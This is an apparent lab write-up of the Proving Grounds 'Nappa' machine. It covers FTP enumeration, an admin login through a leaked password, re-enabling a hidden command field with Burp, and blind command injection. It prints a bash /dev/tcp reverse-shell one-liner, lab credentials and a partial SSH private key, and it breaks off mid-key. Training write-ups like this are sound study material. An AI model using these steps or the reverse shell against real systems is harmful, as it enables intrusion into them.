### Nappa Proving Grounds Practice

### Difficulty = Intermediate

### IP Address = 192.168.66.114

Nmap Scan: 

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Nappa]                                                                                                                                                                       
└─$ nmap -sCV -A 192.168.66.114 -p21,3306,8080,28080 -oN nmapscan                                                                                                                                                  
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-24 02:02 WAT                                                                                                                                                    
Nmap scan report for 192.168.66.114                                                                                                                                                                                
Host is up (0.22s latency).                                                                                                                                                                                        
                                                                                                                                                                                                                   
PORT      STATE SERVICE    VERSION                                                                                                                                                                                 
21/tcp    open  ftp        vsftpd 3.0.3                                                                                                                                                                            
| ftp-syst:                                                                                                                                                                                                        
|   STAT:                                                                                                                                                                                                          
| FTP server status:                                                                                                                                                                                               
|      Connected to 192.168.49.66                                                                                                                                                                                  
|      Logged in as ftp                                                                                                                                                                                            
|      TYPE: ASCII                                                                                                                                                                                                 
|      No session bandwidth limit                                                                                                                                                                                  
|      Session timeout in seconds is 300                                                                                                                                                                           
|      Control connection is plain text                                                                                                                                                                            
|      Data connections will be plain text                                                                                                                                                                         
|      At session startup, client count was 3                                                                                                                                                                      
|      vsFTPd 3.0.3 - secure, fast, stable                                                                                                                                                                         
|_End of status                                                                                                                                                                                                    
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                                                                                             
|_drwxr-xr-x   14 14       11           4096 Nov 06  2020 forum                                                                                                                                                    
3306/tcp  open  mysql?                                                                                                                                                                                             
| fingerprint-strings:                                                                                                                                                                                             
|   DNSStatusRequestTCP, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LPDString, NULL, RTSPRequest, SSLSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe:                
|_    Host '192.168.49.66' is not allowed to connect to this MariaDB server                                                                                                                                        
8080/tcp  open  http-proxy                                                                                                                                                                                         
| fingerprint-strings:                                                                                                                                                                                             
|   GetRequest, HTTPOptions:                                                                                                                                                                                       
|     HTTP/1.0 403 Forbidden                                                                                                                                                                                       
|     Content-Type: text/html; charset=UTF-8                                                                                                                                                                       
|     Content-Length: 3102                                                                                                                                                                                         
|     <!DOCTYPE html>                                                                                                                                                                                              
|     <html lang="en">                                                                                                                                                                                             
|     <head>                                                                                                                                                                                                       
|     <meta charset="utf-8" />                                                                                                                                                                                     
|     <title>Action Controller: Exception caught</title>                                                                                                                                                           
|     <style>                                                                                                                                                                                                      
|     body {                                                                                                                                                                                                       
|     background-color: #FAFAFA;                                                                                                                                                                                   
|     color: #333;                                                                                                                                                                                                 
|     margin: 0px;                                                                                                                                                                                                 
|     body, p, ol, ul, td {                                                                                                                                                                                        
|     font-family: helvetica, verdana, arial, sans-serif;                                                                                                                                                          
|     font-size: 13px;                                                                                                                                                                                             
|     line-height: 18px;                                                                                                                                                                                           
|     font-size: 11px;                                                                                                                                                                                             
|     white-space: pre-wrap;                                                                                                                                                                                       
|     pre.box {                                                                                                                                                                                                    
|     border: 1px solid #EEE;                                                                                                                                                                                      
|     padding: 10px;                                               
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
|_http-title: ForumOnRails
28080/tcp open  http       Apache httpd 2.4.46 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix)
|_http-title: html5-goku-en-javascript
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

Checking ftp 

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Nappa]
└─$ ftp 192.168.66.114
Connected to 192.168.66.114.
220 (vsFTPd 3.0.3)
Name (192.168.66.114:mark): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||43967|)
150 Here comes the directory listing.
dr-xr-xr-x    3 0        11           4096 Nov 06  2020 .
dr-xr-xr-x    3 0        11           4096 Nov 06  2020 ..
drwxr-xr-x   14 14       11           4096 Nov 06  2020 forum
226 Directory send OK.
ftp> 
```

Checking it further shows its the likely the source of a web page

```
ftp> cd forum
250 Directory successfully changed.
ftp> ls -al
229 Entering Extended Passive Mode (|||57463|)
150 Here comes the directory listing.
drwxr-xr-x   14 14       11           4096 Nov 06  2020 .
dr-xr-xr-x    3 0        11           4096 Nov 06  2020 ..
drwxr-xr-x    7 0        0            4096 Nov 06  2020 .git
-rw-r--r--    1 0        0             766 Nov 06  2020 .gitignore
-rw-r--r--    1 0        0              11 Nov 06  2020 .ruby-version
-rw-r--r--    1 0        0            1965 Nov 06  2020 Gemfile
-rw-r--r--    1 0        0            5512 Nov 06  2020 Gemfile.lock
-rw-r--r--    1 0        0             374 Nov 06  2020 README.md
-rw-r--r--    1 0        0             227 Nov 06  2020 Rakefile
drwxr-xr-x   11 0        0            4096 Nov 06  2020 app
drwxr-xr-x    2 0        0            4096 Nov 06  2020 bin
drwxr-xr-x    5 0        0            4096 Nov 06  2020 config
-rw-r--r--    1 0        0             130 Nov 06  2020 config.ru
drwxr-xr-x    2 0        0            4096 Nov 06  2020 db
drwxr-xr-x    4 0        0            4096 Nov 06  2020 lib
drwxr-xr-x    2 0        0            4096 Nov 06  2020 log
-rw-r--r--    1 0        0             217 Nov 06  2020 package.json
drwxr-xr-x    2 0        0            4096 Nov 06  2020 public
drwxr-xr-x    2 0        0            4096 Nov 06  2020 storage
drwxr-xr-x   10 0        0            4096 Nov 06  2020 test
drwxr-xr-x    5 0        0            4096 Nov 06  2020 tmp
drwxr-xr-x    2 0        0            4096 Nov 06  2020 vendor
226 Directory send OK.
ftp> 
```

So i need to get the .git file then dump the repo using gittools 

Now i'll dump the git to my device using gitdumper.sh from GitTools

```
┌──(mark__haxor)-[~/_/Nappa/ftp/192.168.66.114/forum]                                                                                                                                                              
└─$ bash ~/Desktop/Tools/GitTools/Dumper/gitdumper.sh  ftp://anonymous:anonymous@192.168.66.114/forum/.git/ extracted                                                                                              
###########                                                                                                                                                                                                        
# GitDumper is part of https://github.com/internetwache/GitTools                                                                                                                                                   
#                                                                                                                                                                                                                  
# Developed and maintained by @gehaxelt from @internetwache                                                                                                                                                        
#                                                                                                                                                                                                                  
# Use at your own risk. Usage might be illegal in certain circumstances.                                                                                                                                           
# Only for educational purposes!                                                                                                                                                                                   
###########                                                                                                                                                                                                        
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
[*] Destination folder does not exist                                                                                                                                                                              
[+] Creating extracted/.git/                                                                                                                                                                                       
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs                                                                       
[+] Downloaded: description     
[+] Downloaded: config
[-] Downloaded: COMMIT_EDITMSG
[-] Downloaded: index
[-] Downloaded: packed-refs          
[-] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash        
[-] Downloaded: logs/HEAD  
[-] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
                                                    
┌──(mark__haxor)-[~/_/Nappa/ftp/192.168.66.114/forum]
└─$ l                                 
extracted/                                   
                                                    
┌──(mark__haxor)-[~/_/Nappa/ftp/192.168.66.114/forum]
└─$ cd extracted                                 
                                                    
┌──(mark__haxor)-[~/_/ftp/192.168.66.114/forum/extracted]
└─$ l                                                                                                    
                                                    
┌──(mark__haxor)-[~/_/ftp/192.168.66.114/forum/extracted]
└─$ ls -al
total 12                                                                                                 
drwxr-xr-x 3 mark mark 4096 Jan 24 02:16 .
drwxr-xr-x 4 mark mark 4096 Jan 24 02:14 ..
drwxr-xr-x 6 mark mark 4096 Jan 24 02:16 .git 
```

Now that we have the git directory i'll use extractor.sh from GitTools tool

```
┌──(mark__haxor)-[~/_/ftp/192.168.66.114/forum/extracted]
└─$ mkdir extract  
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/ftp/192.168.66.114/forum/extracted]
└─$ bash ~/Desktop/Tools/GitTools/Extractor/extractor.sh . extract
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/ftp/192.168.66.114/forum/extracted]
└─$ ls -l extract 
total 0
                                                                                                                                                                                                                                                                                                                                                                                                                         
┌──(mark__haxor)-[~/_/ftp/192.168.66.114/forum/extracted]
└─$ git log 
fatal: your current branch 'master' does not have any commits yet
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/ftp/192.168.66.114/forum/extracted]
└─$ cd .git      
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/192.168.66.114/forum/extracted/.git]
└─$ git log 
fatal: your current branch 'master' does not have any commits yet
```                                                                
 
It wasn't able to dump any commit because non were made also the ftp i couldn't find any sort of cred :(

Lets move on lol 

Checking port 8080 which is a web server running on it 

We see its a forum 
![image](https://user-images.githubusercontent.com/113513376/214193949-acf27d13-c66e-49e6-9059-ca5009aca595.png)

It also has a register/login function and the home page shows list of usernames 

I'll save them for future use 

```
westley.dakari
willam.iran
logun.vergil
admin.forum 
romaan.juanluis
```

On navigating to register function the source code leaks a password
![image](https://user-images.githubusercontent.com/113513376/214194988-736ac244-d5f9-49c3-bd51-f817f0ae97f8.png)

But since we don't have email to login we can't really do anything for now

So i created an account so i could view the forum

And there's no really any functions as a normal user
![image](https://user-images.githubusercontent.com/113513376/214195278-0ac9d574-107e-4b50-b2b1-6655079a9687.png)


Checking the whole questions on the forum i got the admin email
![image](https://user-images.githubusercontent.com/113513376/214194490-99179d28-b090-4bc4-bd3c-358359d82b8b.png)

```
Email: admin.forum@easysetting.com
```

I also see we can edit page which gives us an upload function but on trying to upload a php file was successfull but when i tried executing i got an error
![image](https://user-images.githubusercontent.com/113513376/214194733-4139f3a6-d0cd-4ec7-8987-fb62e0538478.png)

Its a tool used to process images then view it and since the file i uploaded wasn't an image file it couldn't process it

Now lets get trying to login as admin now that we have the email and password

```
Email: admin.forum@easysetting.com
Password: it0jNc6L/r090Q==
```

ANd it worked
![image](https://user-images.githubusercontent.com/113513376/214195160-71ff4964-e13e-460e-99c8-16f244b9c6e6.png)

We also see a new function has been added
![image](https://user-images.githubusercontent.com/113513376/214195378-7b03a1e9-888b-4289-b02f-0b5ab698670d.png)

Lets check our the new function 

It gives the current status of the server
![image](https://user-images.githubusercontent.com/113513376/214195488-59e22e80-5eaa-43d0-9e7b-40a4920cddb3.png)

But on checking the source code we get this
![image](https://user-images.githubusercontent.com/113513376/214195540-7a436a3a-7452-44d1-8c0a-c8150a0839f0.png)

From that we know that the execute command function is disabled because its commented 

I'll have to remove the comment so that i'll be able to access it

So i'll refresh the page but this time i'll intercept the request on burp suite
![image](https://user-images.githubusercontent.com/113513376/214195920-eaa1b7f1-1679-4b10-9b1b-bba158265906.png)

Now i'll select the `do intercept / response to request` option
![image](https://user-images.githubusercontent.com/113513376/214196018-d7f05c7e-03d4-4d0f-b648-16c178c47fa7.png)

Here's the request

```
HTTP/1.1 200 OK
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin-when-cross-origin
Content-Type: text/html; charset=utf-8
ETag: W/"54340bdacde12806d93cb6f4af10efd2"
Cache-Control: max-age=0, private, must-revalidate
Set-Cookie: _forum_on_rails_session=mEynEhmM4K9Zq72TUJYIFWHpNbri%2BHgjvFYPW4gXHkoYp8hRoMt8V%2BpU7%2FvzXVze%2FdHk1TaU6wGbi8Uc8yqcKuXjTaOLYgkSvqWpjMYfzqzuo72MvyiwImBI0BUwgAloH%2FpWSrAKn2pGeKUfnNVKZVNJfR1c1w2wCHzJs0kXjm2yzo7NrMyr64BlvqfTeJwA2wxgOC5lDOq9yn2zUEgHv6vOgh1AAa2asV5yGl07ExksEcDjupIIJOQYv1LQAuMUTu6R2l8%2Bx%2FwH22xaRUFmvHxfMWQ06oTKzTWO1AFD9p0r8LpfheihhKPGgSYrWtgR8tCjLj9MeBAXMpXi82Ye7DHB2TheTdETjcw%2Bzlr%2Be%2BYrXt0Hc5FSPQIDYAaQHtvy%2BL31fnE83wYfzNnfmmzJiHWMSHSe85c6QpDzv4llkcBNfh5veCj%2FzZOTXvd2qWmJEg6HMdSiNiujlt0CRKDHFOYJ%2FdUAoG6Mp7%2F4Ybqq2RAufSPf60AqYru83neQ7Vcyht9O9JROnNbPsdW6ztZm--gmzo%2F4FydiAUvVrj--8BkBi0j9JS2sURWXbIEQhw%3D%3D; path=/; HttpOnly
X-Request-Id: 4aafda82-9db5-4a78-9e56-552f06758798
X-Runtime: 0.021567
Connection: close
Content-Length: 4799

<!DOCTYPE html>
<html>
  <head>
    <title>ForumOnRails</title>
    <meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="roUQCTkh+oR1u7Azu+nfiH8Uvns0X9fHCglqmTmwrU0OS8PH4xVLwVk2K/lqYPPn+QSe+9V6p8IEmG9OgDX/OQ==" />
    

    <link rel="stylesheet" media="all" href="/assets/application.debug-4c9deb2d55c130518e97561a9d44d7ca3a5a5fd22682e25ca394d3dcd1ca7fce.css" data-turbolinks-track="reload" />
    <script src="/packs/js/application-c27353e203c8eb05d91f.js" data-turbolinks-track="reload"></script>
  </head>

  <body>
    <div id="wrap">
      <nav class="navbar navbar-expand-lg navbar-dark bg-primary">
  <div class="container">
    <a class="navbar-brand" href="/">
      <i class="fas fa-users"></i>
      ForumOnRails
    </a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarColor03" aria-controls="navbarColor03" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>

    <div class="collapse navbar-collapse" id="navbarColor03">
      
      <form class="form-inline my-2 my-lg-0 w-100">
        <input class="form-control-sm mr-sm-1 search-input" type="text" placeholder="Search">
        <button class="btn btn-sm btn-secondary my-2 my-sm-0" type="submit">
          <i class="fas fa-search"></i>
        </button>
      </form>
      <ul class="navbar-nav ml-auto ml-md-0">
          <li class="nav-item dropdown no-arrow mx-1">
            <!--
            <a class="nav-link dropdown-toggle" href="#" id="alertsDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
              <i class="fas fa-bell fa-fw"></i>
              <span class="badge badge-danger">9+</span>
            </a>
            <div class="dropdown-menu dropdown-menu-right" aria-labelledby="alertsDropdown">
              <a class="dropdown-item" href="#">Action</a>
              <a class="dropdown-item" href="#">Another action</a>
              <div class="dropdown-divider"></div>
              <a class="dropdown-item" href="#">Something else here</a>
            </div>
            -->
          </li>
          <li class="nav-item dropdown no-arrow mx-1">
            <!-- 
            <a class="nav-link dropdown-toggle" href="#" id="messagesDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
              <i class="fas fa-envelope fa-fw"></i>
              <span class="badge badge-danger">7</span>
            </a>
            
            <div class="dropdown-menu dropdown-menu-right" aria-labelledby="messagesDropdown">
              <a class="dropdown-item" href="#">Action</a>
              <a class="dropdown-item" href="#">Another action</a>
              <div class="dropdown-divider"></div>
              <a class="dropdown-item" href="#">Something else here</a>
            </div>
            -->
          </li>
          <li class="nav-item dropdown no-arrow">
            <a class="nav-link dropdown-toggle" href="#" id="userDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
              <i class="fas fa-user-circle fa-fw"></i>
            </a>
            <div class="dropdown-menu dropdown-menu-right" aria-labelledby="userDropdown">
              <a class="dropdown-item" href="#">Settings</a>
              <a class="dropdown-item" href="/serverinfo">Server Status</a>
              <a class="dropdown-item" href="#">Activity Log</a>
              <div class="dropdown-divider"></div>
              <a class="dropdown-item" rel="nofollow" data-method="delete" href="/logout">Logout</a>
            </div>
          </li>
      </ul>
    </div>
  </div>
</nav>
      
      <div id="main" class="container pt-4">
        <h1>Current status</h1>
<p>

<form action="/serverinfo" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="+4g06CLKiVIRjgt1b4Xp72XXGRbxOAyBvAJoC0WR2ISwCPAPj6UYk037moyjSFBfzt5Tpcmf+lnke/usSrb+AQ==" /> 
  <input type="text" name="cmd" readonly="">
  <input type="submit" >
  
  <br>
  Mem:<br>               total        used        free      shared  buff/cache   available
Mem:          1.9Gi       301Mi       1.5Gi       0.0Ki       174Mi       1.5Gi
Swap:            0B          0B          0B
<br><br>
  OS: <br>Arch Linux \r (\l)

<br><br>
  PS:<br>     PID TTY          TIME CMD
    296 ?        00:00:11 bundle
    871 ?        00:00:00 ps
<br><br>
  Users:<br> <br><br>

</form>
</p>

      </div>

      <footer class="py-5 bg-primary">
        <div class="container">
          <p class="m-0 text-center text-white">Copyright &copy; Your Website 2019</p>
        </div>
        <!-- /.container -->
      </footer>
    </div>
  </body>
</html>
```

Now i will forward the request to the server
![image](https://user-images.githubusercontent.com/113513376/214196088-ead98cf3-00f5-44ef-913d-aabc26540e46.png)

So we can now execute command lets confirm it

But one problem its set to read only
![image](https://user-images.githubusercontent.com/113513376/214196143-c8d51640-d493-4009-86d8-201e49945da1.png)
![image](https://user-images.githubusercontent.com/113513376/214196179-8cdfb0f6-2275-4fb4-9fb9-6f3f18028cd2.png)

So i'll send it to burp again but this time remove the `readonly` check

Here's how it should look now

```
<input type="text" name="cmd">
```

Now we can write values in the checkbox
![image](https://user-images.githubusercontent.com/113513376/214196549-b7561cf9-32c6-48fd-97e6-eb87f8d1481f.png)

So now i'll try running an OS command but i'll pass it to burp so that i can remove the comment & readony check
![image](https://user-images.githubusercontent.com/113513376/214196761-f5ead0bf-8afc-462c-b914-8f92324ac52e.png)

Now on forwarind and removing the checks

Here's the output 
![image](https://user-images.githubusercontent.com/113513376/214197039-9b04f41c-fa2e-4eee-a2ab-a1c689e8f80a.png)

And it doesn't really show if it works or not 

So now i'll ping my host to know if its really command injection
![image](https://user-images.githubusercontent.com/113513376/214197197-c911041e-5e82-4549-81b8-4f236f155fb1.png)

```
┌──(mark__haxor)-[~/_/Pg/Practice/Nappa/ftp]
└─$ sudo tcpdump -i tun0 icmp
[sudo] password for mark: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
02:55:57.575460 IP 192.168.66.114 > haxor: ICMP echo request, id 1, seq 1, length 64
02:55:57.581486 IP haxor > 192.168.66.114: ICMP echo reply, id 1, seq 1, length 64
02:55:58.578568 IP 192.168.66.114 > haxor: ICMP echo request, id 1, seq 2, length 64
02:55:58.578645 IP haxor > 192.168.66.114: ICMP echo reply, id 1, seq 2, length 64
```

It really is command injection but its a blind command injection meaning we can't see the output

Now lets get a reverse shell 

Payload: 

```
/bin/bash -i >& /dev/tcp/192.168.49.66/21 0>&1
```

On giving that payload we get a call back on our netcat listener

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Nappa]
└─$ nc -lvnp 21                                                  
listening on [any] 21 ...
connect to [192.168.49.66] from (UNKNOWN) [192.168.66.114] 57034
bash: cannot set terminal process group (296): Inappropriate ioctl for device
bash: no job control in this shell
[kathleen@nappa forum]$ 
```

So lets stabilize the shell

```
/usr/bin/script -qc /bin/bash /dev/null
export TERM=xterm
CTRL + Z
stty raw -echo;fg
```

Now on checking the users directory we see that the bashrc file size is large

```
[kathleen@nappa ~]$ ls -al
total 40
drwx------  5 kathleen kathleen 4096 Nov 16  2020 .
drwxr-xr-x  3 root     root     4096 Nov  4  2020 ..
-rw-------  1 kathleen kathleen    0 Nov  6  2020 .bash_history
-rw-r--r--  1 kathleen kathleen   21 Aug  9  2020 .bash_logout
-rw-r--r--  1 kathleen kathleen   57 Aug  9  2020 .bash_profile
-rw-r--r--  1 kathleen kathleen 4302 Nov  6  2020 .bashrc
drwxr-xr-x  3 kathleen kathleen 4096 Nov  4  2020 .bundle
drwxr-xr-x  4 kathleen kathleen 4096 Nov  4  2020 .gem
drwxr-xr-x 15 kathleen kathleen 4096 Nov  4  2020 forum
-rw-------  1 kathleen kathleen   33 Jan 24 00:59 local.txt
[kathleen@nappa ~]$
```

Lets check out the content 

```
[kathleen@nappa ~]$ cat .bashrc
#
# ~/.bashrc
#

# If not running interactively, don't do anything
[[ $- != *i* ]] && return

alias ls='ls --color=auto'
PS1='[\u@\h \W]\$ '








# alias FUWS2LJNIJCUOSKOEBHVARKOKNJUQICQKJEVMQKUIUQEWRKZFUWS2LJNBJRDGQTMMJXE46TBIMYXEWSYNN2GI2SFIFAUCQKBIJDTK5TCNVKUCQKBIFCWE3JZOVNFCQKBIFAUCQKBIFAUEQKBIFBGY52BIFAUCZD2MMZGO5DDNYFE42CBIFAUCQLXIVAUCUKBIFAVSRKBNVVWKV3WOY2HKTKVGRAWW6LYNIVSW6THIZMHE5TDLE3GE6DOGVDDS5DRJ4YTMODJMIYHGYLQKJDWS2RPKZLAUY2QK5WFCVDDJZXDI4CBOFMHG3SEGA3FERRUGFRFMTRWJJSDQ3KGINNFG53WI5QU62KVNZIFA4LYKVXDKTCWMRUDIV3JJ5HFMTSGI5JHCRZLMVFFSCRTPBHG6TDKNBVEIQLGGJKC6VDPJ5FDIZ3HPEYE4RCRGN4DS3KXGJ3UKTSJOAZTMY2HINCWWMKYOZ4DE4DOGJCHQWKOKJZUCQTLJZ3U26CVN53VMOIKNZMTM4DWKVFG23ZRIVGEWUBVGBBUUWDEPJ3TS6CENFMXG2DXMJMXQTLWNA2HQ6TKJZ2W6RDUK5MFC2KOKUZWIOCZJA2DIYSKNVJHITSKPI4EUQSYBJEFU3SEJ5JTSYTUGMZUIWCFMFRU4YSYIRXEESDRIFGDMWLZPFDW4T3PN5VVSWTOIVZTIM3XNN2DETSRNA4W4SDRGUYSWUJWIFCHMK3YMNDVI6JQM4FE42JVMF5HIWDOLF4UUWSXNJJUMNSZNJ4GUZCBPB3GW5ZQKUXUW3TSJJZHA2LUI5MDQNLCOAYHC6D2MRDHI6BUKFEFM3CZIZMXGTKUHEZVKYRPNJSAU2L2KZ2XG5TZGVHHKK3MJNYUSK2INBIXG5KVOYYU62RRLBLDONKHHE2FQTDRIE2FMWBXKZIHCODPGB3UO33QKVCDAMDSM5ZWUQ3GKJHVUU2UMY3G2CTTONNGQWRQORXDIUSWIFEW64KKMFZVAY2JI5DGERJTJY4EK6SKG5TDGVSDJJKUWRCBIFAUMZ2JIVHXO52LIJCHGTKDIFAUCQKCGNHHUYKDGF4WGMQKIVAUCQKHIJAUU4CINRZDOK2MNJDE6QKKJVZVSL3WOM2EEVRWG4ZUOT3NHBNCWUTGMJQWU5DFOZEW2OKMI5YVKUTPN4XTCVSYIQYXAVKFGNCFUK2LBJIUW3BXJJ3TST3LKJSU4VZRKRSWSWDGJJUFC3KVONGHQ3LKN5WEU6T2GZZVMSRLKMYVQWLFIZXWU2SWKRJFE23BNB3G42KXJY4FIYKDGQ2FS53XJAFDS2ZPGA3EI2LFJFEU25CEKEYE4ODGLJWHI42CIRJUWZBLNZBGO2CKJZLDOODEOFNDSZZYK5CFKYSBIFNEIY2EJVLEWTKGMZNDET3RMIYUGWTRJZJAUQ3ZNIVWIQLJKYZWGOCQMNITI3KMJFRUOMSNKRGDIZKNMM2HUYTRIE3VM3BQJFVFMTRTMZDUEK2PI54VU23CKRJWGL2DKFLHQMS2O55GW5SXG5SDSCTXGF4EO3SEK4YXONLXKI3GOQZLNVGXG2DQPJYUWSSHI5NHQTCPJY4EUTDENJKUSZS2PA3HKZDGNNHWOQJXF5ZVQQTLHB2ESRCZOVLXGN2WGUZE22IKK5LG6MDIMVWUSOCZGNIU2YRVJVHEMUDZOA3HSYJWLFZFE3BPJ5LTMZCLONRTGUTCMNSUKQRRLJLUEV2MIRCS6ZBRI4XTIM2ZOMYWE4SMHB2VIYTWBJYFG4LJKBUDIVKMJRWEYOKUN44VMMLFFNJHMZKGPE3GOT2GKYVTCVBWOZFU4TKCOFFVMQJZJZFTITCJO5XDAVDNKVVTGK3QOJGEOWKXMRGFUK2FKYFFCQ2LJNUVO4SEGNBUE2CXPBHHUZSCJV4WKMZZGFIWSVSDM53UCQKBIFGUEQKBIVAUCQKHIFCDKQKYJNRTQVKNHA4E42LDONNGU5LLGNHFUT2BJFTAURTKPIZE2ZTIMFNESY2JJZ3E25CEMRZUIY2XJVTFM4LNIFWC622SJ5IG6VBZMVBEQ4LZGF3DC6JXGNBEQL2VNF4GUMBXLJ4DO6LKIUZDINKCJNYFSCTBJJRVI5DLIVWW4VSLORZFKTS2MJTHS33EHFUEG3KNIUZXS5LSOJGHEY3VKEVXKWSRLA4U4WLNOEZVIWJYPE4HEOCGJFKVQRSLORHXAQLXINHE2WAKIZ4DGNDRJRSU4TTCOBTXM3TMKI3XQM32MY4WIYSCPBDW44LXOJZEQTCEONBDGSLSPFAVKZTMNNHGCWBSJBYHARSOLIZUCTLJJBYSWSCFJNVHA2KPBJYFIYSQIVLTMSLVJ5DFOSCHJNLFUWLEGJLWI2LMGIVVUSLPJY3VU2CVK53GITKLM5UHQSSJJ5KEK6BQKAYFEQLJMY3XM2RRK44DG6CIOZ4FMYZZOUFEC6L2OA2DSZRSKFCW65RLLJDVK3LGIZJFINZYMEZFEMZZJZGGKRDBIFEE2VTOMJXDCUSPPI3XA3SVLFFFMN2FJNJEKVSUHAVS6TTMNN5ES5C2JN4AUUCDM5DHOR3TPI2GCULMMVBVGVDKMFEWSNK2JRUES6DOK52UIUCDNJTWEYSJK5XFQR2IMI4EG22TLA2XUSCTMZ4EO5DLMZJW2OK2N5MGKUZRNRXG4CTSK53EIWLTPA4XM5DRGF3HKVLTINUEETCEOFDHO5LVJJBFQ2DVPFJVI33BJ5IVCTLJG5JXC4TJM5VFCYLPJNMVOWJUMVIXQ3RZKFMDA6SSIFAUCQIKO5DXUL3XJ4YWEOCRGRIEMZZYGU3W2VRXOFNDSV3JKJEHQZLPKFAVKTRXKJRVGZTCM5YHOK2WIJSFK4CLJ5VG4NDSMRYTIULJJZYESZLQPJQUS2ZWBJCFSSDEKYYECVSBONNHU4DVNNDFAWKVMJTHSWCWKZ2CWL2SF5BW2V2IGQVS6Y3BNJKXAV2OMVCDM3BTLJXVESSEK5FDG5ZXOZMFEKZUOBRFCY2WFMFEOSTBO5YVOMKGMM3WMMDVNMVVSODIOB2WKN2YNNZHSS3NGBIUQTCWJJXDINCFOBSUYNSJGQ2XKWSSORHGM4DRORSVSMDLJBKTCQJSOJTHQSKCMY2QUZ2HFN4UGRKKNF3WI4CFJNWES6SNNZSDQWBYN52GIWLHHAXW63LVNRREIZKKGJ3G6WRLN43XUYSFO5AUCQKNIVAXUU2JMNFXCRBXNZUVONSOJN3VGCSYJN2WM43YFNRDKUCJLI3ESVC2JFMGCZ2LOY3FA3RQGZMVE6CDNNHUES2KMR2TKL2DOI3FUN2KJVWUWU2BGNNHKTRYKBYDMVJRPBXWCM2QIM2UUKYKIFFVCSRZIZRW2VCRNM4UY3RYGRVEOU2PNNUGUMCPKBEGMYJVLBQTGRLKJM2XCZDXMFIDE2LXJZSTIU2YPFME6OKUG5XXAQJWJVBG6WCPGRJEWYLDBIXUI33JMZ3TS4L2GFMVU6D2KRUG4MJSF5NHA6DYHBYXE6KOOFWHG6RXGB2WUOBYLBZUKWCBLFXE4MRPJE4S6SDMJNYDQ4BZJBMXG4D2LFZGGRSZJMFFCSKHPB5FQODVPEZG65CTKZXVOVRYI5BDSUJQMNSUYZCDMM3UCQKBIF3VCRCBNFKWUWCGHBWXSQSZOQYUUNDHLJTUE4CZGVSFUVSRG4ZWYYKVGJ3AU2KUJRHGSRSYGRBWESJVHFYDMT2YNFWHQWLNF53HIU3ZJNLGU4SGNRXGYYJXKV2E64DJG5MWY2BTKBLXK6RUGNTUQM3MF5VW4WRTNRTDORDONJFE6CRPKU3HK6BZJJ3GK5CQJV5HAOLROJTDQ22SJQ4FEVCNNJUTETDPGNTWSWLFOZTVINCMOYZUCU2UKFLUKN2EJZQWQQKZO5LDARSBGRYHOQJVMRIUQ4IKKY4VUZTEJ5JFIODRIREFQNCGKNCWEWJWHAYW2RCCGY3G423SIQ2UC32ZJ42FQWKZMQ3DO5TZGJBTGS2PLBCDSOJQGFWGY3KNFNTDEYKHOA4FK2SJBJEHUZSLJVVTQV3HGI3VM22BIFAUCS3DNU4XMZCFIJ2VSWCCO5MVCRJ5BIWS2LJNFVCU4RBAJ5IEKTSTKNECAUCSJFLECVCFEBFUKWJNFUWS2LIK
[kathleen@nappa ~]$ 
```

Its doing alias with a large encoded value 

I'll decode it using cyberchef
![image](https://user-images.githubusercontent.com/113513376/214198147-922f603b-a408-401f-9d96-3265afaa6a9d.png)

its base32 encoded and its value is an ssh key 

Since there's no ssh port available externally i'll have to ssh while in the box

But first i need the decoded file to be on the box 
```
[kathleen@nappa ~]$ vim en                                                                                                                                                                                  [17/17]
[kathleen@nappa ~]$ base32 -d en                                                                                                                                                                                   
-----BEGIN OPENSSH PRIVATE KEY-----                                                                                                                                                                                
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn                                                                                                                                             
NhAAAAAwEAAQAAAYEAmkeWvv4uMU4Akyxj++zgFXrvcY6bxn5F9tqO168ib0sapRGij/VV                                                                                                                                             
